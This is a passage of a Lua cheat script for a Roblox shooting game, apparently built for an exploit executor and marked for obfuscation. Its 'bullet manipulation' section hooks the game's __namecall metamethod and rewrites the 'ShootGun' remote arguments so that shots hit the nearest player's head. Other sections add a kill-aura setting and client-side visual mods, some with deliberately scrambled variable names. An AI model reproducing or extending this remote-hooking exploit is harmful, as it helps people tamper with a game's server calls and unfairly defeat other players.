        nymuskillaura.KillAura.Distance = Value
    end
})
local fov_circle_man = Drawing.new("Circle")
fov_circle_man.Thickness = 1
fov_circle_man.NumSides = 100
fov_circle_man.Filled = false
fov_circle_man.Transparency = 1
local fov_outline = Drawing.new("Circle")
fov_outline.Thickness = 1
fov_outline.NumSides = 100
fov_outline.Filled = false
fov_outline.Transparency = 1
fov_outline.Color = Color3.new(0, 0, 0)
local fov_inline = Drawing.new("Circle")
fov_inline.Thickness = 1
fov_inline.NumSides = 100
fov_inline.Filled = false
fov_inline.Transparency = 1
fov_inline.Color = Color3.new(0, 0, 0)
_G.ManipulationEnabled = false
_G.ShowFOV = false
_G.FOVColor = Color3.fromRGB(255, 255, 255)
_G.FOVSize = 100
local target_position = Vector3.new()
local target_part = nil
local smart_origin = Vector3.new()
local main_event = game:GetService("ReplicatedStorage"):WaitForChild("MainEvent")
local ray_params = RaycastParams.new()
ray_params.FilterType = Enum.RaycastFilterType.Exclude
local manipulationn = Main:section({name = "bullet manipulation", side = "right"})
manipulationn:toggle({
    name = "enabled",
    flag = "manipulationenableddd6767",
    default = false,
    callback = function(Value)
        _G.ManipulationEnabled = Value
    end
})
manipulationn:toggle({
    name = "show fov",
    flag = "manipulnableddd6767",
    default = false,
    callback = function(Value)
        _G.ShowFOV = Value
    end
})
manipulationn:colorpicker({
    flag = "manipulation_fov_color",
    color = Color3.fromRGB(255, 255, 255),
    callback = function(color)
        _G.FOVColor = color
    end
})
manipulationn:slider({
    name = "fov size",
    flag = "fovmanipul",
    suffix = " studs",
    default = 100,
    min = 0,
    max = 1000,
    interval = 0.1,
    callback = function(Value)
        _G.FOVSize = Value
    end
})
local get_nearest_in_fov = LPH_NO_VIRTUALIZE(function()
    local nearest_player = nil
    local nearest_distance = math.huge
    local character = LocalPlayer.Character
    local my_hrp = character and character:FindFirstChild("HumanoidRootPart")
    if not my_hrp then return nil end
    local mouse_pos = UserInputService:GetMouseLocation()
    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer or not player.Character then continue end
        local hrp = player.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then continue end
        local screen_pos, on_screen = Camera:WorldToViewportPoint(hrp.Position)
        if on_screen then
            local distance_to_mouse = (Vector2.new(screen_pos.X, screen_pos.Y) - mouse_pos).Magnitude
            if distance_to_mouse <= _G.FOVSize then
                if distance_to_mouse < nearest_distance then
                    nearest_distance = distance_to_mouse
                    nearest_player = player
                end
            end
        end
    end
    return nearest_player
end)
RunService.Heartbeat:Connect(LPH_JIT_MAX(function()
    local mouse_pos = UserInputService:GetMouseLocation()
    fov_circle_man.Visible = _G.ShowFOV
    fov_circle_man.Color = _G.FOVColor
    fov_circle_man.Radius = _G.FOVSize
    fov_circle_man.Position = mouse_pos
    fov_outline.Visible = _G.ShowFOV
    fov_outline.Radius = _G.FOVSize + 1
    fov_outline.Position = mouse_pos
    fov_inline.Visible = _G.ShowFOV
    fov_inline.Radius = _G.FOVSize - 1
    fov_inline.Position = mouse_pos
    if not _G.ManipulationEnabled then return end
    local character = LocalPlayer.Character
    if not character then return end
    local tool = character:FindFirstChildOfClass("Tool")
    local handle = tool and tool:FindFirstChild("Handle")
    if not handle then return end
    local target = get_nearest_in_fov()
    if not target or not target.Character then return end
    local head = target.Character:FindFirstChild("Head")
    local target_hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if not head or not target_hrp then return end
    target_position = target_hrp.Position
    target_part = head
    ray_params.FilterDescendantsInstances = {character, target.Character}
    local player_origin = handle.Position
    local target_pos = head.Position
    local direction = (player_origin - target_pos).Unit
    local distance = (player_origin - target_pos).Magnitude
    local result = workspace:Raycast(target_pos, direction * distance, ray_params)
    smart_origin = (result and result.Instance) and (result.Position + direction * 0.1) or player_origin
end))
local old_namecall
old_namecall = hookmetamethod(game, "__namecall",(newcclosure(function(self, ...)
    local method = getnamecallmethod()
    local args = {...}
    if not checkcaller() and self == main_event and method == "FireServer" and args[1] == "ShootGun" and _G.ManipulationEnabled then
        args[3] = smart_origin
        args[4] = target_position
        args[5] = target_part
        args[6] = Vector3.new(0, 0, 0)
        return old_namecall(self, unpack(args))
    end
    return old_namecall(self, ...)
end)))]]
_G.dzzzz = LocalPlayer.CameraMaxZoomDistance
_G.defaultFOV = Camera.FieldOfView
_G.fovonn = false
_G.fovalllll = 90
_G.aspectEnabled = false
_G.RegionSpoofer_Enabled = false
_G.RegionSpoofer_Text = ""
getgenv().Resolution = {["x"] = 1, ["y"] = 1}
getgenv().origmaterials = getgenv().origmaterials or {}
getgenv().currenttxtg = getgenv().currenttxtg or {}
local cam_section = World:section({name = "camera"})
local cc_section = World:section({name = "color correction"})
local v35 = World:section({name = "map textures"})
local region_section = World:section({name = "region spoofer"})
cam_section:toggle({
    name = "infinite zoom",
    flag = "cam_infzoom",
    callback = function(val)
        LocalPlayer.CameraMaxZoomDistance = val and math.huge or _G.dzzzz
    end
})

cam_section:toggle({
    name = "fov changer",
    flag = "cam_fovchng",
    callback = function(val)
        _G.fovonn = val
    end
})
cam_section:slider({
    name = "fov",
    flag = "cam_fovval",
    min = 0,
    max = 120,
    default = 90,
    interval = 0.1,
    callback = function(val)
        _G.fovalllll = val
    end
})
cam_section:toggle({
    name = "aspect ratio",
    flag = "cam_aspect_toggle",
    callback = function(val)
        _G.aspectEnabled = val
    end
})

cam_section:slider({
    name = "ratio x",
    flag = "cam_aspect_x",
    min = 0,
    max = 1,
    default = 1,
    interval = 0.1,
    callback = function(val)
        getgenv().Resolution["x"] = val
    end
})

cam_section:slider({
    name = "ratio y",
    flag = "cam_aspect_y",
    min = 0,
    max = 1,
    default = 1,
    interval = 0.1,
    callback = function(val)
        getgenv().Resolution["y"] = val
    end
})
_G.ColorCorrection = {Enabled = false, Saturation = 0, Contrast = 0, Brightness = 0}
local function getColorCorrection()
    local cc = Lighting:FindFirstChild("CustomColorCorrection")
    if not cc then
        cc = Instance.new("ColorCorrectionEffect")
        cc.Name = "CustomColorCorrection"
        cc.Enabled = false
        cc.Parent = Lighting
    end
    return cc
end
local applyColorCorrection = LPH_NO_VIRTUALIZE(function()
    local cc = getColorCorrection()
    cc.Enabled = _G.ColorCorrection.Enabled
    cc.Saturation = _G.ColorCorrection.Saturation
    cc.Contrast = _G.ColorCorrection.Contrast
    cc.Brightness = _G.ColorCorrection.Brightness
end)
cc_section:toggle({
    name = "enabled",
    flag = "cc_enabled",
    callback = function(val)
        _G.ColorCorrection.Enabled = val
        applyColorCorrection()
    end
})
cc_section:slider({
    name = "saturation",
    flag = "cc_sat",
    min = -1,
    max = 1,
    default = 0,
    interval = 0.1,
    callback = function(val)
        _G.ColorCorrection.Saturation = val
        applyColorCorrection()
    end
})

cc_section:slider({
    name = "contrast",
    flag = "cc_con",
    min = -1,
    max = 1,
    default = 0,
    interval = 0.1,
    callback = function(val)
        _G.ColorCorrection.Contrast = val
        applyColorCorrection()
    end
})
cc_section:slider({
    name = "brightness",
    flag = "cc_bri",
    min = -1,
    max = 1,
    default = 0,
    interval = 0.1,
    callback = function(val)
        _G.ColorCorrection.Brightness = val
        applyColorCorrection()
    end
})
getgenv().TextureThemeEnabled = false
local selectedThemeList = {}
local materialService = game:GetService("MaterialService")
local createdVariants = {}

local function clearVariants()
    for _, v in ipairs(createdVariants) do
        if v then v:Destroy() end
    end
    table.clear(createdVariants)
end

local function applyFastTextures(textureList)
    clearVariants()
    if not getgenv().TextureThemeEnabled then return end

    for _, data in ipairs(textureList) do
        local matName = data[1]
        local assetId = data[2]
        
        if not assetId:find("rbxassetid://") and not assetId:find("http") then
            assetId = "rbxassetid://" .. assetId
        end

        local variant = Instance.new("MaterialVariant")
        variant.Name = "Vader_" .. matName
        variant.BaseMaterial = Enum.Material[matName]
        variant.ColorMap = assetId
        variant.NormalMap = assetId
        variant.RoughnessMap = assetId
        variant.MetalnessMap = assetId
        variant.StudsPerTile = 5
        variant.Parent = materialService
        
        table.insert(createdVariants, variant)
        materialService:SetBaseMaterialOverride(Enum.Material[matName], variant.Name)
    end
end

local function restoreMaterials()
    clearVariants()
    local materials = Enum.Material:GetEnumItems()
    for _, mat in ipairs(materials) do
        pcall(function()
            materialService:SetBaseMaterialOverride(mat, "")
        end)
    end
end

v35:toggle({
    name = "enabled",
    flag = "texture_enabled_toggle",
    callback = function(val)
        getgenv().TextureThemeEnabled = val
        if val then
            if #selectedThemeList > 0 then
                applyFastTextures(selectedThemeList)
            end
        else
            restoreMaterials()
        end
    end
})

v35:dropdown({
    name = "select theme",
    flag = "map_texture_dropdown",
    items = {"playboi carti", "minecraft", "minecraft2", "icey", "weed minecraft"},
    callback = function(val)
        local newList = {}
        if val == "playboi carti" then
            newList = {
                {"Wood", "14784281899"}, {"WoodPlanks", "14784281899"},
                {"Brick", "12647798329"}, {"Cobblestone", "12647798329"},
                {"Concrete", "12647798329"}, {"DiamondPlate", "128808789797567"},
                {"Fabric", "128808789797567"}, {"Granite", "4722586771"},
                {"Grass", "17303981964"}, {"Ice", "17303981964"},
                {"Marble", "17303981964"}, {"Metal", "114917525242362"},
                {"Sand", "114917525242362"}, {"Slate", "114917525242362"},
            }
        elseif val == "minecraft" then
            newList = {
                {"Wood", "128754006217410"}, {"WoodPlanks", "8676581022"},
                {"Brick", "8139086777"}, {"Cobblestone", "17874801808"},
                {"Concrete", "9405731606"}, {"DiamondPlate", "14197861013"},
                {"Fabric", "9744916443"}, {"Granite", "4714662147"},
                {"Grass", "9267183930"}, {"Ice", "11413423466"},
                {"Marble", "14974016515"}, {"Metal", "14524282848"}, 
                {"Sand", "11119324718"}, {"Slate", "7801228489"},
            }
        elseif val == "minecraft2" then
            newList = {
                {"Slate", "8676746437"},
                {"Grass", "9267183930"},
                {"Sand", "12624140843"},
                {"Wood", "3258599312"},
                {"Brick", "10777285622"},
                {"Concrete", "15622710576"},
                {"CorrodedMetal", "78612695839404"},
                {"Metal", "121650613091353"},
                {"WoodPlanks", "8676581022"}
            }
        elseif val == "icey" then
            newList = {
                {"Wood", "5933003775"}, {"WoodPlanks", "5933003775"},
                {"Brick", "17295828838"}, {"Cobblestone", "11760888310"},
                {"Concrete", "109017797659108"}, {"DiamondPlate", "11760888310"},
                {"Fabric", "140018484507153"}, {"Granite", "16833201065"},
                {"Grass", "140018484507153"}, {"Ice", "1090177976591089"},
                {"Marble", "62967586"}, {"Metal", "11760888310"},
                {"Sand", "16833201065"}, {"Slate", "7397414089"},
            }
        elseif val == "weed minecraft" then
            local mats = {"Wood","WoodPlanks","Brick","Cobblestone","Concrete","DiamondPlate","Fabric","Granite","Grass","Ice","Marble","Metal","Sand"}
            for _, mat in ipairs(mats) do
                table.insert(newList, {mat, "4722588177"})
            end
        end
        
        selectedThemeList = newList
        if getgenv().TextureThemeEnabled and #selectedThemeList > 0 then
            applyFastTextures(selectedThemeList)
        end
    end
})
local topbarLabel = nil
pcall(function()
    topbarLabel = LocalPlayer.PlayerGui.TopbarStandard.Holders.Left.Widget.IconButton.Menu.IconSpot.Contents.IconLabelContainer.IconLabel
    _G.OriginalRegionText = topbarLabel.Text
end)

region_section:toggle({
    name = "enabled",
    flag = "region_enabled",
    callback = function(val)
        _G.RegionSpoofer_Enabled = val
        if topbarLabel then
            topbarLabel.Text = (val and _G.RegionSpoofer_Text and _G.RegionSpoofer_Text ~= "") and _G.RegionSpoofer_Text or _G.OriginalRegionText
        end
    end
})

region_section:textbox({
    name = "ur text",
    flag = "region_custom_text",
    callback = function(val)
        _G.RegionSpoofer_Text = val
        if _G.RegionSpoofer_Enabled and topbarLabel and val ~= "" then
            topbarLabel.Text = val
        end
    end
})
RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()
    if _G.fovonn then 
        Camera.FieldOfView = _G.fovalllll 
    else 
        Camera.FieldOfView = _G.defaultFOV 
    end
    if _G.aspectEnabled then
        local res = getgenv().Resolution
        Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, res["x"], 0, 0, 0, res["y"], 0, 0, 0, 1)
    end
    if _G.RegionSpoofer_Enabled and topbarLabel and _G.RegionSpoofer_Text and _G.RegionSpoofer_Text ~= "" then
        topbarLabel.Text = _G.RegionSpoofer_Text
    end
end))
_G.hit_effect_color = Color3.fromRGB(255, 81, 0)
_G.hit_effect_enabled = false
_G.selected_hit_effect = "Nova"
_G.hiteffectTable = {
    ["Nova"] = function(position)
        local part = Instance.new("Part")
        part.Position = position
        part.Anchored = true
        part.Transparency = 1
        part.CanCollide = false
        part.Parent = Workspace

        local colorSeq = ColorSequence.new(_G.hit_effect_color)

        local particle1 = Instance.new("ParticleEmitter")
        particle1.Color = colorSeq
        particle1.Lifetime = NumberRange.new(0.5, 0.5)
        particle1.LightEmission = 1
        particle1.LockedToPart = true
        particle1.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
        particle1.Rate = 0
        particle1.Size = NumberSequence.new{NumberSequenceKeypoint.new(0, 0, 0), NumberSequenceKeypoint.new(1, 10, 0)}
        particle1.Speed = NumberRange.new(1.5, 1.5)
        particle1.Texture = "rbxassetid://1084991215"
        particle1.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0, 1, 0), NumberSequenceKeypoint.new(0.0996047, 0, 0), NumberSequenceKeypoint.new(0.602372, 0, 0), NumberSequenceKeypoint.new(1, 1, 0)}
        particle1.ZOffset = 1
        particle1.Parent = part

        local particle2 = Instance.new("ParticleEmitter")
        particle2.Color = colorSeq
        particle2.Lifetime = NumberRange.new(0.5, 0.5)
        particle2.LightEmission = 1
        particle2.LockedToPart = true
        particle2.Rate = 0
        particle2.Size = NumberSequence.new{NumberSequenceKeypoint.new(0, 0, 0), NumberSequenceKeypoint.new(1, 10, 0)}
        particle2.Speed = NumberRange.new(0, 0)
        particle2.Texture = "rbxassetid://1084991215"
        particle2.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0, 1, 0), NumberSequenceKeypoint.new(0.0996047, 0, 0), NumberSequenceKeypoint.new(0.601581, 0, 0), NumberSequenceKeypoint.new(1, 1, 0)}
        particle2.ZOffset = 1
        particle2.Parent = part

        local particle3 = Instance.new("ParticleEmitter")
        particle3.Color = colorSeq
        particle3.Lifetime = NumberRange.new(0.2, 0.5)
        particle3.LockedToPart = true
        particle3.Orientation = Enum.ParticleOrientation.VelocityParallel
        particle3.Rate = 0
        particle3.Rotation = NumberRange.new(-90, 90)
        particle3.Size = NumberSequence.new{NumberSequenceKeypoint.new(0, 1, 0), NumberSequenceKeypoint.new(1, 8.5, 1.5)}
        particle3.Speed = NumberRange.new(0.1, 0.1)
        particle3.SpreadAngle = Vector2.new(180, 180)
        particle3.Texture = "http://www.roblox.com/asset/?id=6820680001"
        particle3.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0, 1, 0), NumberSequenceKeypoint.new(0.200791, 0, 0), NumberSequenceKeypoint.new(0.699605, 0, 0), NumberSequenceKeypoint.new(1, 1, 0)}
        particle3.ZOffset = 1.5
        particle3.Parent = part

        particle1:Emit(1)
        particle2:Emit(1)
        particle3:Emit(1)

        task.delay(1, function()
            part:Destroy()
        end)
    end,
    ["Blood"] = function(position)
        local MainPart = Instance.new("Part", Workspace)
        MainPart.Transparency = 1
        MainPart.Size = Vector3.new(2, 2, 2)
        MainPart.Position = position
        MainPart.CanCollide = false
        MainPart.Anchored = true
        
        local Attachment = Instance.new("Attachment", MainPart)
        local Blood = Instance.new("ParticleEmitter", Attachment)
        Blood.Acceleration = Vector3.new(0, -75, 0)
        Blood.Color = ColorSequence.new(_G.hit_effect_color)
        Blood.Lifetime = NumberRange.new(0.25, 0.5)
        Blood.Orientation = Enum.ParticleOrientation.VelocityParallel
        Blood.Rate = 100
        Blood.Size = NumberSequence.new{NumberSequenceKeypoint.new(0, 0.125, 0), NumberSequenceKeypoint.new(1, 0.25, 0.1)}
        Blood.Speed = NumberRange.new(5, 15)
        Blood.SpreadAngle = Vector2.new(90, 90)
        Blood.Texture = "rbxassetid://4509687978"
        Blood.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0, 1, 0), NumberSequenceKeypoint.new(0.25, 0, 0), NumberSequenceKeypoint.new(1, 1, 0)}
        Blood:Emit(3)
        task.delay(1, function() MainPart:Destroy() end)
    end,
    ["Glitch"] = function(position)
        local MainPart = Instance.new("Part", Workspace)
        MainPart.Transparency = 1
        MainPart.Size = Vector3.new(2.6, 5.52, 2.8)
        MainPart.Position = position
        MainPart.CanCollide = false
        MainPart.Anchored = true

        local textureId = "rbxassetid://6888586040"
        for i = 1, 10 do
            local pe = Instance.new("ParticleEmitter", MainPart)
            pe.Color = ColorSequence.new(_G.hit_effect_color)
            pe.Lifetime = NumberRange.new(0.1, 0.1)
            pe.Rate = 30
            pe.Size = NumberSequence.new(0.4)
            pe.Texture = textureId
            pe.Transparency = NumberSequence.new(0)
        end

        task.delay(3, function() MainPart:Destroy() end)
    end,
    ["Slash"] = function(position)
        local Part = Instance.new("Part", Workspace)
        Part.Size = Vector3.new(2, 2, 2)
        Part.Anchored = true
        Part.CanCollide = false
        Part.Transparency = 1
        Part.Position = position
        local Attachment = Instance.new("Attachment", Part)
        local Crescents = Instance.new("ParticleEmitter", Attachment)
        Crescents.Lifetime = NumberRange.new(0.19, 0.38)
        Crescents.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(0.1932907, 0), NumberSequenceKeypoint.new(0.778754, 0), NumberSequenceKeypoint.new(1, 1)}
        Crescents.LightEmission = 10
        Crescents.Color = ColorSequence.new(_G.hit_effect_color)
        Crescents.Speed = NumberRange.new(0.08)
        Crescents.Brightness = 4
        Crescents.Size = NumberSequence.new{NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(0.39, 8.8), NumberSequenceKeypoint.new(1, 11.4)}
        Crescents.Texture = "rbxassetid://12509373457"
        Crescents.RotSpeed = NumberRange.new(800, 1000)
        Crescents.Orientation = Enum.ParticleOrientation.VelocityPerpendicular
        task.delay(1.5, function() Part:Destroy() end)
    end,
    ["Cosmic"] = function(position)
        local Part = Instance.new("Part", Workspace)
        Part.Size = Vector3.new(2, 2, 2)
        Part.Anchored = true
        Part.CanCollide = false
        Part.Transparency = 1
        Part.Position = position
        local Attachment = Instance.new("Attachment", Part)
        local colorSeq = ColorSequence.new(_G.hit_effect_color)
        
        local function createP(tex, size, life)
            local p = Instance.new("ParticleEmitter", Attachment)
            p.Color = colorSeq
            p.Texture = tex
            p.Size = size
            p.Lifetime = life
            p.Brightness = 5
            return p
        end
        createP("rbxassetid://8708637750", NumberSequence.new(9, 16), NumberRange.new(0.16))
        createP("rbxassetid://8196169974", NumberSequence.new(0, 11), NumberRange.new(0.3))
        task.delay(1.5, function() Part:Destroy() end)
    end,
    ["CrescentSlash"] = function(position)
        local Part = Instance.new("Part", Workspace)
        Part.Size = Vector3.new(2, 2, 2)
        Part.Anchored = true
        Part.CanCollide = false
        Part.Transparency = 1
        Part.Position = position
        local Attachment = Instance.new("Attachment", Part)
        local colorSeq = ColorSequence.new(_G.hit_effect_color)
        local Glow = Instance.new("ParticleEmitter", Attachment)
        Glow.Lifetime = NumberRange.new(0.16)
        Glow.Color = colorSeq
        Glow.Brightness = 5
        Glow.Size = NumberSequence.new(9, 16)
        Glow.Texture = "rbxassetid://8708637750"
        local Shards = Instance.new("ParticleEmitter", Attachment)
        Shards.Lifetime = NumberRange.new(0.2, 0.7)
        Shards.Color = colorSeq
        Shards.Speed = NumberRange.new(90, 140)
        Shards.Texture = "rbxassetid://8030734851"
        task.delay(3, function() Part:Destroy() end)
    end
}
local hit_effects_section = World:section({name = "hit effects"})
hit_effects_section:toggle({
    name = "enabled",
    flag = "hit_effect_toggle",
    callback = function(val)
        _G.hit_effect_enabled = val
    end
})
hit_effects_section:colorpicker({
    flag = "hit_effect_color_picker",
    color = _G.hit_effect_color,
    callback = function(color, alpha)
        _G.hit_effect_color = color
    end
})
hit_effects_section:dropdown({
    name = "effect",
    flag = "hit_effect_dropdown",
    items = {"Nova", "Blood", "Glitch", "Slash", "Cosmic", "CrescentSlash"},
    callback = function(val)
        _G.selected_hit_effect = val
    end
})
local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
LocalPlayer.CharacterAdded:Connect(function(char)
    character = char
end)
if workspace:FindFirstChild("Ignored") and workspace.Ignored:FindFirstChild("Siren") and workspace.Ignored.Siren:FindFirstChild("Radius") then
    workspace.Ignored.Siren.Radius.ChildAdded:Connect(LPH_NO_VIRTUALIZE(function(Object)
        if Object.Name ~= "BULLET_RAYS" then return end
        local charName = character.Name
        if not Object:GetAttribute("OwnerCharacter") or Object:GetAttribute("OwnerCharacter") ~= charName then return end
        if not _G.hit_effect_enabled then return end
        task.delay(0.05, function()
            if not Object.Parent then return end
            local startPos = Object.Position
            local direction = Object.CFrame.LookVector
            local params = RaycastParams.new()
            params.FilterDescendantsInstances = {character, workspace.Ignored}
            params.FilterType = Enum.RaycastFilterType.Exclude
            local result = workspace:Raycast(startPos, direction * 1000, params)
            if result and result.Instance then
                local hitPart = result.Instance
                local hitPosition = result.Position
                local hitCharacter = hitPart:FindFirstAncestorWhichIsA("Model")
                if hitCharacter and hitCharacter:FindFirstChild("Humanoid") and game.Players:GetPlayerFromCharacter(hitCharacter) then
                    local effectFunc = _G.hiteffectTable[_G.selected_hit_effect]
                    if effectFunc then
                        effectFunc(hitPosition)
                    end
                end
            end
        end)
    end))
end
local brainrotspawner = World:section({name = "brainrot spawner"})
_G.dokjgongiudbfiudbeiugsb = "rbxassetid://72466520546640"
_G.slighdfiugshdfiug = 5
_G.backflip_chance = 30
_G.oifughdfiughdfiug = game:GetService("Players").LocalPlayer
_G.pfoighfduighdfiug = game:GetService("RunService")
local act_br = {}
local br_con = nil
_G.qwoifughdfiugh = LPH_NO_VIRTUALIZE(function(oifgh)
    local oifug = 30
    for i = 1, oifug do
        local oifghdf = math.rad(math.random(0, 360))
        local oifgudf = math.random(100, 1500)
        local oifughd = Vector3.new(math.cos(oifghdf) * oifgudf, 500, math.sin(oifghdf) * oifgudf)
        local oifghu = oifgh + oifughd
        local oifghudf = RaycastParams.new()
        oifghudf.FilterType = Enum.RaycastFilterType.Exclude
        local oifghud = workspace:Raycast(oifghu, Vector3.new(0, -2000, 0), oifghudf)
        if oifghud then
            local oifghudsf = RaycastParams.new()
            oifghudsf.FilterType = Enum.RaycastFilterType.Exclude
            local oifghuds = workspace:Raycast(oifghud.Position + Vector3.new(0, 5, 0), Vector3.new(0, 20, 0), oifghudsf)
            if not oifghuds then
                return oifghud.Position
            end
        end
    end
    return oifgh + Vector3.new(math.random(-50, 50), 0, math.random(-50, 50))
end)
local function clear_brainrots()
    if br_con then
        br_con:Disconnect()
        br_con = nil
    end
    for _, data in pairs(act_br) do
        if data.Model then
            data.Model:Destroy()
        end
    end
    table.clear(act_br)
end
local function spawn_brainrots()
    clear_brainrots()
    local success, objects = pcall(function()
        return game:GetObjects(_G.dokjgongiudbfiudbeiugsb)
    end)
    if success and objects then
        local char = _G.oifughdfiughdfiug.Character or _G.oifughdfiughdfiug.CharacterAdded:Wait()
        local root = char:WaitForChild("HumanoidRootPart")
        for i = 1, _G.slighdfiugshdfiug do
            for _, source in pairs(objects) do
                local model = source:Clone()
                model.Parent = workspace
                for _, p in pairs(model:GetDescendants()) do
                    if p:IsA("BasePart") then
                        p.CanCollide = false
                        p.CanTouch = false
                        p.CanQuery = false
                    end
                end
                local s_pos = _G.qwoifughdfiugh(root.Position)
                local t_pos = _G.qwoifughdfiugh(s_pos)
                table.insert(act_br, {
                    Model = model,
                    CurrentPos = s_pos,
                    TargetPos = t_pos,
                    CurrentLook = CFrame.lookAt(s_pos, t_pos),
                    Speed = math.random(14, 24),
                    JumpHeight = 0,
                    JumpVel = 0,
                    IsJumping = false,
                    IsBackflipping = false,
                    FlipRot = 0
                })
            end
        end
        br_con = _G.pfoighfduighdfiug.Heartbeat:Connect(LPH_JIT_MAX(function(dt)
            local char_now = _G.oifughdfiughdfiug.Character
            local root_now = char_now and char_now:FindFirstChild("HumanoidRootPart")
            if not root_now then return end
            for i = 1, #act_br do
                local data = act_br[i]
                local model = data.Model
                if not model or not model.Parent then continue end
                local dist = (Vector3.new(data.TargetPos.X, data.CurrentPos.Y, data.TargetPos.Z) - data.CurrentPos).Magnitude
                if dist < 12 then
                    data.TargetPos = _G.qwoifughdfiugh(data.CurrentPos)
                end
                local rayp = RaycastParams.new()
                rayp.FilterDescendantsInstances = {model, char_now}
                rayp.FilterType = Enum.RaycastFilterType.Exclude
                local wall = workspace:Raycast(data.CurrentPos + Vector3.new(0, 4, 0), data.CurrentLook.LookVector * 12, rayp)
                if wall then
                    data.TargetPos = _G.qwoifughdfiugh(data.CurrentPos)
                end
                if not data.IsJumping and math.random(1, 45) == 1 then
                    data.IsJumping = true
                    data.JumpVel = math.random(45, 65)
                    if math.random(1, 100) <= _G.backflip_chance then
                        data.IsBackflipping = true
                        data.FlipRot = 0
                    end
                end
                if data.IsJumping then
                    data.JumpVel = data.JumpVel + (-110 * dt)
                    data.JumpHeight = data.JumpHeight + (data.JumpVel * dt)
                    if data.IsBackflipping then
                        data.FlipRot = data.FlipRot + (dt * 12)
                    end
                    if data.JumpHeight <= 0 then
                        data.JumpHeight = 0
                        data.JumpVel = 0
                        data.IsJumping = false
                        data.IsBackflipping = false
                    end
                end
                local tlook = CFrame.lookAt(data.CurrentPos, Vector3.new(data.TargetPos.X, data.CurrentPos.Y, data.TargetPos.Z))
                data.CurrentLook = data.CurrentLook:Lerp(tlook, 4.5 * dt)
                data.CurrentPos = data.CurrentPos + (data.CurrentLook.LookVector * data.Speed * dt)
                local gray = workspace:Raycast(data.CurrentPos + Vector3.new(0, 100, 0), Vector3.new(0, -500, 0), rayp)
                local gy = gray and gray.Position.Y or data.CurrentPos.Y
                local cyc = math.sin(tick() * (data.Speed * 0.9))
                local finalcf = CFrame.new(data.CurrentPos.X, gy + (math.abs(cyc) * 0.7) + data.JumpHeight, data.CurrentPos.Z) 
                    * data.CurrentLook.Rotation 
                    * CFrame.Angles(math.rad((data.JumpVel * 0.04) * 22) + (data.IsBackflipping and data.FlipRot or 0), 0, math.rad(cyc * 12))
                model:PivotTo(finalcf)
            end
        end))
    end
end
brainrotspawner:toggle({
    name = "enabled",
    flag = "hit_effect_togg",
    callback = function(val)
        if val then
            spawn_brainrots()
        else
            clear_brainrots()
        end
    end
})
brainrotspawner:slider({
    name = "brainrots",
    flag = "lighting_f",
    min = 1,
    max = 50,
    default = 5,
    interval = 1,
    callback = function(v)
        _G.slighdfiugshdfiug = v
    end
})
brainrotspawner:slider({
    name = "backflip chance",
    flag = "lighting_f",
    min = 0,
    max = 100,
    default = 18,
    suffix = '%',
    interval = 1,
    callback = function(v)
        _G.backflip_chance = v
    end
})
_G.LightingSettings = _G.LightingSettings or {
    Enabled = false,
    Ambient = { Enabled = false, Color = Color3.fromRGB(255, 255, 255) },
    ColorShiftTop = { Enabled = false, Color = Color3.fromRGB(255, 255, 255) },
    ColorShiftBottom = { Enabled = false, Color = Color3.fromRGB(0, 0, 0) },
    Fog = { Enabled = false, Color = Color3.fromRGB(100, 100, 150), Start = 0, End = 100 },
    ClockTime = { Enabled = false, Value = 12 }
}
local Lighting = game:GetService("Lighting")
local OriginalSettings = {
    Ambient = Lighting.Ambient,
    ColorShift_Top = Lighting.ColorShift_Top,
    ColorShift_Bottom = Lighting.ColorShift_Bottom,
    FogColor = Lighting.FogColor,
    FogEnd = Lighting.FogEnd,
    FogStart = Lighting.FogStart,
    ClockTime = Lighting.ClockTime
}
local applyLighting = LPH_NO_VIRTUALIZE(function()
    local settings = _G.LightingSettings
    if not settings.Enabled then
        Lighting.Ambient = OriginalSettings.Ambient
        Lighting.ColorShift_Top = OriginalSettings.ColorShift_Top
        Lighting.ColorShift_Bottom = OriginalSettings.ColorShift_Bottom
        Lighting.FogColor = OriginalSettings.FogColor
        Lighting.FogEnd = OriginalSettings.FogEnd
        Lighting.FogStart = OriginalSettings.FogStart
        Lighting.ClockTime = OriginalSettings.ClockTime
        return
    end
    Lighting.Ambient = settings.Ambient.Enabled and settings.Ambient.Color or OriginalSettings.Ambient
    Lighting.ColorShift_Top = settings.ColorShiftTop.Enabled and settings.ColorShiftTop.Color or OriginalSettings.ColorShift_Top
    Lighting.ColorShift_Bottom = settings.ColorShiftBottom.Enabled and settings.ColorShiftBottom.Color or OriginalSettings.ColorShift_Bottom
    if settings.Fog.Enabled then
        Lighting.FogColor = settings.Fog.Color
        Lighting.FogEnd = settings.Fog.End
        Lighting.FogStart = settings.Fog.Start
    else
        Lighting.FogColor = OriginalSettings.FogColor
        Lighting.FogEnd = OriginalSettings.FogEnd
        Lighting.FogStart = OriginalSettings.FogStart
    end
    Lighting.ClockTime = settings.ClockTime.Enabled and settings.ClockTime.Value or OriginalSettings.ClockTime
end)
game:GetService("RunService").Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
    local settings = _G.LightingSettings
    if settings and settings.Enabled and settings.ClockTime.Enabled then
        Lighting.ClockTime = settings.ClockTime.Value
    end
end))
local lightningBox = World:section({name = "lighting", side = "right"})
lightningBox:toggle({
    name = "enabled",
    flag = "lighting_master",
    default = _G.LightingSettings.Enabled,
    callback = function(v)
        _G.LightingSettings.Enabled = v
        applyLighting()
    end
})
lightningBox:toggle({
    name = "ambient",
    flag = "lighting_ambient_toggle",
    callback = function(v)
        _G.LightingSettings.Ambient.Enabled = v
        applyLighting()
    end
})
lightningBox:colorpicker({
    name = "ambient color",
    flag = "lighting_ambient_color",
    color = Color3.fromRGB(255, 255, 255),
    callback = function(c)
        _G.LightingSettings.Ambient.Color = c
        applyLighting()
    end
})
lightningBox:toggle({
    name = "color shift top",
    flag = "lighting_top_toggle",
